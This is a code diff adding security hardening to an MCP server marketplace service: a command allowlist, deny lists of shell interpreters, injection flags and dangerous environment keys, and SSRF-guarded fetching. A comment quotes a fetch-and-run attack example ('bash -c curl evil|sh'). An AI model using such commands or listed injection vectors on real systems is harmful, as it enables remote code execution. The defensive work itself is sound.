@@ -16,6 +16,42 @@ import { IMCPServerDefinition, IMCPMarketplaceItem, MCPTransportType,
         MCP_MARKETPLACE_CACHE_KEY,
         MCP_MARKETPLACE_CACHE_TTL_MS
 } from '../../../../../../platform/construct/common/mcp/mcpTypes.js';
+import { safeFetch } from '../../../../../../platform/construct/common/security/urlGuard.js';
+
+/**
+ * SEC-9 (K2-C3 fix): Allowed commands for marketplace-installed MCP servers.
+ *
+ * Marketplace entries pass arbitrary `command` strings to spawn(). Without an
+ * allowlist, a compromised github.com/modelcontextprotocol/servers (or a MITM
+ * on raw.githubusercontent.com) could push a registry entry with
+ * `command="bash" args=["-c","curl evil|sh"]` and the user's click on
+ * "Install" would save a malicious def that — once approved — RCEs on Start.
+ *
+ * We restrict to the three standard MCP-server launchers. Shell interpreters
+ * (bash, sh, zsh, cmd, powershell, python*, ruby, perl, node -e, etc.) are
+ * NEVER allowed from a marketplace entry. Users who need a custom command
+ * can still add servers manually via MCPServerRegistry.addServer() (which
+ * goes through the same userApproved consent gate).
+ */
+const MARKETPLACE_ALLOWED_COMMANDS: ReadonlySet<string> = new Set([
+        'npx',
+        'uvx',
+        'docker',
+        'node',  // some MCP servers ship as plain node scripts
+]);
+
+/**
+ * Commands that are EXPLICITLY forbidden even if they somehow appear in the
+ * allowlist above (defense-in-depth — caught here even if a future edit to
+ * MARKETPLACE_ALLOWED_COMMANDS accidentally adds one of these).
+ */
+const MARKETPLACE_FORBIDDEN_COMMANDS: ReadonlySet<string> = new Set([
+        'bash', 'sh', 'zsh', 'ksh', 'csh', 'tcsh', 'fish',
+        'cmd', 'powershell', 'pwsh',
+        'python', 'python2', 'python3',
+        'perl', 'ruby', 'php',
+        'eval', 'exec', 'source',
+]);
 
 export class MCPMarketplaceService extends Disposable implements IMCPMarketplace {
         declare readonly _serviceBrand: undefined;
@@ -68,7 +104,18 @@ export class MCPMarketplaceService extends Disposable implements IMCPMarketplace
                 try {
                         this.logService.info('[MCP Marketplace] Fetching catalog from registry...');
 
-                        const response = await fetch(MCP_REGISTRY_URL);
+                        // SEC-9 (K2-C3 fix): Use safeFetch() instead of raw fetch().
+                        // safeFetch() validates the URL against the SSRF allowlist
+                        // (assertSafeUrl: blocks 169.254.169.254, 127.0.0.1, 10/8,
+                        // 172.16/12, 192.168/16, ::1, fe80::/10, localhost, *.internal,
+                        // *.local, *.localhost) AND follows redirects manually so a
+                        // 302 to a private IP is caught at each hop. The prior code
+                        // used raw fetch() with no validation — a MITM on the
+                        // raw.githubusercontent.com CDN could redirect to an
+                        // attacker-controlled server returning a malicious catalog.
+                        const response = await safeFetch(MCP_REGISTRY_URL, {
+                                headers: { 'Accept': 'application/json' },
+                        });
                         if (!response.ok) {
                                 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                         }
@@ -107,10 +154,81 @@ export class MCPMarketplaceService extends Disposable implements IMCPMarketplace
 
                 const serverList = Array.isArray(body) ? body : (body.servers ?? []);
                 const items: IMCPMarketplaceItem[] = [];
+                let skippedCount = 0;
 
                 for (const entry of serverList) {
                         if (!entry || typeof entry !== 'object') { continue; }
                         try {
+                                const command = entry.command ?? entry.install?.command ?? 'npx';
+                                const args = entry.args ?? entry.install?.args ?? [];
+                                const env = entry.env ?? entry.install?.env ?? {};
+
+                                // SEC-9 (K2-C3 fix): validate command against the
+                                // marketplace allowlist. A malicious registry entry
+                                // with command="bash" is silently dropped (and
+                                // logged) rather than reaching the user's Install
+                                // button. See MARKETPLACE_ALLOWED_COMMANDS above
+                                // for the rationale.
+                                if (!this._isMarketplaceCommandAllowed(command)) {
+                                        skippedCount++;
+                                        this.logService.warn(
+                                                `[MCP Marketplace] Skipping registry entry "${entry.name ?? 'unknown'}": ` +
+                                                `command "${command}" is not in the marketplace allowlist (npx/uvx/docker/node only). ` +
+                                                `This is a defense against a compromised registry pushing shell-interpreter commands. `
+                                        );
+                                        continue;
+                                }
+
+                                // SEC-9 (K2-C3 fix): validate args do not contain
+                                // shell-injection flags when the command is a shell
+                                // interpreter (which should have been caught above,
+                                // but defense-in-depth — if MARKETPLACE_ALLOWED_COMMANDS
+                                // is ever loosened, this catches the next layer).
+                                // Also reject `-e` / `--eval` / `-c` flags which are
+                                // RCE primitives in node/python/perl/ruby.
+                                const forbiddenArgPatterns = [
+                                        /^(-e|--eval|--exec|--execute|-[ia]|--interactive)$/i,
+                                        /^--require$/, // node --require <file>
+                                        /^--experimental-loader$/, // node loader
+                                        /^-c$/, // bash -c / sh -c
+                                ];
+                                if (args.some((a: string) => forbiddenArgPatterns.some(p => p.test(a)))) {
+                                        skippedCount++;
+                                        this.logService.warn(
+                                                `[MCP Marketplace] Skipping registry entry "${entry.name ?? 'unknown'}": ` +
+                                                `args contain a shell-injection flag (${args.filter((a: string) => forbiddenArgPatterns.some(p => p.test(a))).join(', ')}). `
+                                        );
+                                        continue;
+                                }
+
+                                // SEC-9 (K2-C3 fix): strip any dangerous env keys
+                                // at parse time so they never reach the Install
+                                // button. The connection pool will strip them
+                                // again at spawn time (defense-in-depth — see
+                                // buildChildEnv() in childEnv.ts).
+                                const DENIED_ENV_KEYS = [
+                                        'NODE_OPTIONS', 'NODE_PATH', 'NODE_REPL_EXTERNAL_MODULE',
+                                        'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT',
+                                        'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
+                                        'ELECTRON_RUN_AS_NODE', 'ELECTRON_NO_ASAR',
+                                        'PYTHONSTARTUP', 'PYTHONPATH', 'PYTHONINSPECT', 'PYTHONHOME',
+                                        'PERL5OPT', 'PERLLIB', 'PERL5LIB',
+                                        'RUBYOPT', 'RUBYLIB',
+                                        'CLASSPATH', 'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS',
+                                        'BASH_ENV', 'ENV', 'ZDOTDIR',
+                                        'npm_config_prefix', 'npm_config_userconfig', 'npm_config_globalconfig',
+                                ];
+                                const sanitizedEnv: Record<string, string> = {};
+                                for (const [k, v] of Object.entries(env)) {
+                                        if (DENIED_ENV_KEYS.includes(k)) {
+                                                this.logService.warn(
+                                                        `[MCP Marketplace] Stripping dangerous env key "${k}" from registry entry "${entry.name ?? 'unknown'}".`
+                                                );
+                                                continue;
+                                        }
+                                        sanitizedEnv[k] = v as string;
+                                }
+
                                 items.push({
                                         id: entry.id ?? `${entry.author ?? 'unknown'}/${entry.name ?? 'unknown'}`,
                                         name: entry.name ?? 'Unknown',
@@ -121,9 +239,9 @@ export class MCPMarketplaceService extends Disposable implements IMCPMarketplace
                                         tags: entry.tags ?? [],
                                         rating: entry.rating ?? 0,
                                         downloadCount: entry.downloadCount ?? entry.stargazers_count ?? 0,
-                                        command: entry.command ?? entry.install?.command ?? 'npx',
-                                        args: entry.args ?? entry.install?.args ?? [],
-                                        env: entry.env ?? entry.install?.env ?? {},
+                                        command,
+                                        args,
+                                        env: sanitizedEnv,
                                         transport: (entry.transport as MCPTransportType) ?? MCPTransportType.Stdio,
                                         featured: entry.featured ?? false,
                                         iconUrl: entry.iconUrl,
@@ -135,7 +253,34 @@ export class MCPMarketplaceService extends Disposable implements IMCPMarketplace
                         }
                 }
 
+                if (skippedCount > 0) {
+                        this.logService.warn(
+                                `[MCP Marketplace] Skipped ${skippedCount} registry entr${skippedCount === 1 ? 'y' : 'ies'} due to K2-C3 command/env validation. ` +
+                                `If you see this consistently, the upstream registry may be compromised — ` +
+                                `verify at https://github.com/modelcontextprotocol/servers/blob/main/registry.json.`
+                        );
+                }
+
                 return items;
+        }
+
+        /**
+         * SEC-9 (K2-C3 fix): Check if a marketplace-provided command is allowed.
+         * Returns true if the command is in MARKETPLACE_ALLOWED_COMMANDS AND not
+         * in MARKETPLACE_FORBIDDEN_COMMANDS. Resolves symlinks via basename()
+         * so "./node" or "/usr/local/bin/npx" pass.
+         */
+        private _isMarketplaceCommandAllowed(command: string): boolean {
+                // Strip path prefix — we only care about the executable name.
+                // Use lastIndexOf to handle Windows backslashes too.
+                const lastSlash = Math.max(command.lastIndexOf('/'), command.lastIndexOf('\\'));
+                const basename = lastSlash >= 0 ? command.slice(lastSlash + 1) : command;
+                const normalized = basename.toLowerCase().trim();
+
+                if (MARKETPLACE_FORBIDDEN_COMMANDS.has(normalized)) {
+                        return false;
+                }
+                return MARKETPLACE_ALLOWED_COMMANDS.has(normalized);
         }
 
         private injectFeaturedServers(): void {
